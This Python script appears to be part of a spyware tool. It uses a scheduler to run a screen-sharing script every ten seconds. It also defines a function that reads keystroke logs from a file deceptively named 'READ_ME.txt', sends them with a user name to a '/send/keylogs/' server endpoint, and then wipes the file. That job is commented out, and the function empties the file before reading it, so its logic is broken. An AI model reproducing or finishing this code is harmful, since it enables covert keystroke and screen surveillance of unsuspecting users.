from apscheduler.schedulers.blocking import BlockingScheduler
import datetime
import requests
username='newUser2'



def test():
    exec(open("screenShare.py").read())


def keyloggersend():
    f = open("READ_ME.txt", "w")
    f.write('')
    f.close()
    f = open("READ_ME.txt", "r")
    x = f.read()
    print("data from file: " + x)
    r = requests.get("http://127.0.0.1:8000/send/keylogs/", params={'content': x, 'user': username})
    print("request status: " + str(r))
    print("request text: " + r.text)
    f.close()
    f = open("READ_ME.txt", "w")
    f.write('')
    f.close()


scheduler = BlockingScheduler()
scheduler.add_job(test, 'cron', second='0,20,40')
scheduler.add_job(test, 'cron', second='10,30,50')

# scheduler.add_job(keyloggersend, 'cron', second='0,20,40')
scheduler.start()